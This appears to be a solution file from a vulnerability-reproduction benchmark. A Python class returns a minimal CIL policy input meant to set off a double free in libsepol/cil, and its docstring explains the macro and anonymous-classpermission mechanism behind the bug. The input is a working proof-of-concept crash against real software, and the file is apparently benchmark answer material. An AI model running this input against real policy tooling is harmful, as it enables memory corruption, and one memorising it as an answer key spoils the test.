import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a double free in libsepol/cil. It occurs when an
        anonymous classpermission is passed as an argument to a macro. If this
        macro then defines a classpermissionset using the macro parameter, the
        classpermissionset object takes ownership of the anonymous classpermission
        object. However, the anonymous object is also freed when the macro call
        expression is torn down. This leads to the same object being freed twice:
        once as a temporary object, and a second time during the destruction of
        the classpermissionset.

        This PoC constructs the minimal CIL policy to trigger this condition:
        1. `(class c (p))`: Defines a class `c` and a permission `p` to work with.
        2. `(macro m ((classpermission cp)) (classpermissionset s (cp)))`: Defines
           a macro `m` that accepts a classpermission argument named `cp`. The
           macro's body defines a classpermissionset `s` which contains `cp`. The
           key is that `(cp)` resolves to the object passed to the macro.
        3. `(call m ((classpermission c (p))))`: Calls the macro `m` with an
           anonymous (unnamed) `classpermission` object. This sets up the double
           free scenario.

        Args:
            src_path: Path to the vulnerable source code tarball.

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        poc = (
            b"(class c (p))"
            b"(macro m ((classpermission cp)) (classpermissionset s (cp)))"
            b"(call m ((classpermission c (p))))"
        )
        return poc